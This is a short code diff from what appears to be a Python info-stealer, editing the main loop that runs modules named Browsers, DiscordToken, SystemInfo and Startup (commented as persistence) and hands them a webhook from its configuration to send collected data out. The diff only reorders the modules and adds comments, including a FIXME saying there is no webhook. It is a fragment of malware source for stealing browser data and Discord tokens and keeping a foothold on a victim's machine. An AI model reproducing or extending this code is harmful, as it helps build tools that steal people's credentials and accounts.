@@ -21,17 +21,17 @@ def main():
     logging.getLogger("rich")
 
     funcs = [
-        Browsers,
-        DiscordToken,
-        Startup,
-        SystemInfo,
+        Browsers, # General browser data
+        DiscordToken, # Discord-specific data
+        SystemInfo, # General system information
+        Startup, # Persistence
     ]
 
     for func in funcs:
         if __CONFIG__[func.__name__.lower()]:
             try:
                 if func.__init__.__code__.co_argcount == 2:
-                    func(__CONFIG__['webhook'])
+                    func(__CONFIG__['webhook']) # FIXME: There is no webhook!
                 else:
                     func()
 
